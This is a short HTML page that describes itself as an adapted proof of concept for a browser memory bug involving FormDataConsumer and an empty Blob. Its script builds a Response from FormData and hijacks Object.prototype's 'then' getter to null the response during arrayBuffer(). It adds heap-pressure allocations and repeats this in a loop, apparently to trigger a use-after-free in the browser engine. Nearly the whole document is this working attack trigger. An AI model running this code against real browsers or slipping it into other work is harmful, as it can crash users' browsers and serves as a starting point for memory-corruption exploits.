<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PoC Adaptado - FormDataConsumer empty blob</title>
</head>
<body>
<button id="run">Executar</button>
<script>
function allocPressure(iterations) {
    var sink = [];
    for (var i = 0; i < iterations; i++) {
        sink.push(new Array(256).join('x') + i);
        if (i % 64 === 0) {
            sink.push(new ArrayBuffer(4096));
        }
    }
    return sink.length;
}

function triggerCase() {
    var emptyBlob = new Blob([]);
    var fd = new FormData();
    fd.append('a', emptyBlob);

    var response = new Response(fd);

    Object.prototype.__defineGetter__('then', function() {
        response = null;
        allocPressure(4000);
    });

    allocPressure(2000);
    response.arrayBuffer();
}

document.getElementById('run').onclick = function() {
    for (var round = 0; round < 50; round++) {
        triggerCase();
    }
};
</script>
</body>
</html>
